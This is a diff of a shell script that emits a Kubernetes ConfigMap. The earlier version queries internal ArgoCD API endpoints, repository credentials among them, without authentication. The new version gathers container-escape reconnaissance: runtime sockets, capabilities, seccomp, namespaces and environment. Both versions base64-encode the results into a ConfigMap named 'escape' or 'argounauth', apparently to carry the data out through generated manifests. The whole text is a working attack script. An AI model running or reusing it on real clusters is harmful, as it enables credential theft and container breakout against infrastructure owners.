@@ -1,41 +1,54 @@
 #!/bin/sh
 RECON=$( (
-  echo "===ARGOCD_STREAM==="
-  printf "GET /api/v1/stream/applications HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 1000
-
-  echo ""
-  echo "===ARGOCD_REPOS==="
-  printf "GET /api/v1/repositories HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 1000
-
-  echo ""
-  echo "===ARGOCD_REPOCREDS==="
-  printf "GET /api/v1/repocreds HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 1000
-
-  echo ""
-  echo "===ARGOCD_APPLICATIONS==="
-  printf "GET /api/v1/applications HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 1000
-
-  echo ""
-  echo "===ARGOCD_ACCOUNT==="
-  printf "GET /api/v1/account HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 1000
-
-  echo ""
-  echo "===ARGOCD_PROJECTS==="
-  printf "GET /api/v1/projects HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 1000
-
-  echo ""
-  echo "===ARGOCD_INFO==="
-  printf "GET /api/v1/info HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 1000
-
-  echo ""
-  echo "===ARGOCD_SSO==="
-  printf "GET /auth/login HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 1000
+  echo "===KERNEL==="
+  uname -a 2>&1
+  
+  echo "===CONTAINERD_SOCKET==="
+  ls -la /run/containerd/containerd.sock 2>&1
+  ls -la /var/run/containerd/containerd.sock 2>&1
+  ls -la /run/dockershim.sock 2>&1
+  
+  echo "===DOCKER_SOCKET==="
+  ls -la /var/run/docker.sock 2>&1
+  ls -la /run/docker.sock 2>&1
+  
+  echo "===CRI_SOCKET==="
+  ls -la /var/run/crio/crio.sock 2>&1
+  find / -name "*.sock" -type s 2>/dev/null | head -20
+  
+  echo "===CAPABILITIES==="
+  cat /proc/1/status 2>/dev/null | grep -i cap
+  
+  echo "===SECCOMP==="
+  cat /proc/1/status 2>/dev/null | grep -i seccomp
+  
+  echo "===PRIVILEGES==="
+  id 2>&1
+  cat /proc/self/status 2>/dev/null | grep -iE "uid|gid|cap"
+  
+  echo "===DEVS==="
+  ls -la /dev/ 2>/dev/null | head -20
+  
+  echo "===CAN_WRITE_HOST==="
+  # Check if we can write anywhere useful
+  touch /dev/shm/test 2>&1 && echo "/dev/shm writable" && rm /dev/shm/test
+  
+  echo "===NET_NAMESPACE==="
+  ls -la /proc/1/ns/net 2>&1
+  cat /proc/1/cgroup 2>/dev/null | head -10
+  
+  echo "===MOUNT_NS==="
+  # Can we access host namespaces?
+  ls -la /proc/1/ns/ 2>&1
+  
+  echo "===ENV_ALL==="
+  env | grep -iE 'host|node|mount|path|ns' 2>/dev/null
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: argounauth
+  name: escape
 data:
   result: $RECON
 EOF
